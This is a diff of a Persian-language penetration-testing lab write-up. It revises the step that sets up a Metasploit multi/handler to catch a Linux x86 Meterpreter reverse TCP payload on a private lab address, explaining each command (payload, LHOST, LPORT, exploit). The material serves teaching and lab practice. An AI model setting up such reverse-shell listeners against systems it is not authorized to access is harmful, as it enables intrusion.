@@ -169,30 +169,53 @@ systemctl start apache2.service
 
 ## ۱۲. راه‌اندازی Handler متِرپرتر
 
-با توجه به تنظیم payload برای اتصال به آدرس `192.168.43.220:444`، ماژول `multi/handler` را در Metasploit اجرا کردم و همان payload از نوع Linux x86 Meterpreter Reverse TCP را برای آن تنظیم کردم:
+بعد از ساخت و میزبانی payload، در Metasploit تنظیمات لازم را انجام دادم تا منتظر اتصال برگشتی آن بماند. برای این کار از ماژول `multi/handler` استفاده کردم و تنظیمات آن را با مقادیری که هنگام ساخت فایل `IM_HERE` تعیین کرده بودم، هماهنگ کردم.
+
+ابتدا ماژول Handler را انتخاب کردم:
 
 ```text
-=[ metasploit v6.4.84-dev                                ]
-+ -- --=[ 2,547 exploits - 1,309 auxiliary - 1,683 payloads     ]
-+ -- --=[ 432 post - 49 encoders - 13 nops - 9 evasion          ]
+use exploit/multi/handler
+```
 
-Metasploit Documentation: https://docs.metasploit.com/
-The Metasploit Framework is a Rapid7 Open Source Project
+این دستور ماژول عمومی Handler را بارگذاری می‌کند؛ ماژولی که برای دریافت اتصال‌های ورودی payloadها استفاده می‌شود.
 
-[*] Starting persistent handler(s)...
-msf > use exploit/multi/handler
-[*] Using configured payload generic/shell_reverse_tcp
-msf exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
-payload => linux/x86/meterpreter/reverse_tcp
-msf exploit(multi/handler) > set lhost 192.168.43.220
-lhost => 192.168.43.220
-msf exploit(multi/handler) > set lport 444
-lport => 444
-msf exploit(multi/handler) > exploit
+سپس نوع payload را مطابق payload ساخته‌شده انتخاب کردم:
+
+```text
+set payload linux/x86/meterpreter/reverse_tcp
+```
+
+با این دستور، Handler برای دریافت اتصال برگشتی Meterpreter با معماری Linux x86 و از طریق TCP تنظیم می‌شود. نوع payload در Handler باید با نوعی که با `msfvenom` ساخته شده مطابقت داشته باشد.
+
+در قدم بعد، آدرس IP ماشین کالی را مشخص کردم:
+
+```text
+set lhost 192.168.43.220
+```
+
+مقدار `LHOST` آدرسی است که Handler روی ماشین کالی برای دریافت اتصال ورودی استفاده می‌کند.
+
+بعد، پورت موردنظر را تنظیم کردم:
+
+```text
+set lport 444
+```
+
+مقدار `LPORT` پورت TCPای را مشخص می‌کند که Metasploit روی آن منتظر اتصال می‌ماند. این پورت با پورتی که هنگام ساخت payload تعیین شده بود، یکسان است.
+
+در پایان، Handler را اجرا کردم:
+
+```text
+exploit
+```
+
+Metasploit پیام زیر را نمایش داد:
+
+```text
 [*] Started reverse TCP handler on 192.168.43.220:444
 ```
 
-این خروجی تأیید می‌کند که Handler با آدرس `192.168.43.220` و پورت `444` راه‌اندازی شده و در انتظار اتصال بوده است. بااین‌حال، هنوز هیچ اتصال ورودی یا نشست Meterpreter در این خروجی دیده نمی‌شود؛ برای تأیید آن‌ها به شواهد جداگانه نیاز است.
+این پیام تأیید می‌کند که Handler روی آدرس `192.168.43.220` و پورت `444` شروع به گوش‌دادن کرده است. اما نشان نمی‌دهد که ماشین هدف متصل شده یا نشست Meterpreter برقرار شده باشد.
 
 ![تصویر ۱۲: فعال شدن multi-handler متِرپرتر روی پورت ۴۴۴](screenshots/12.png)
 
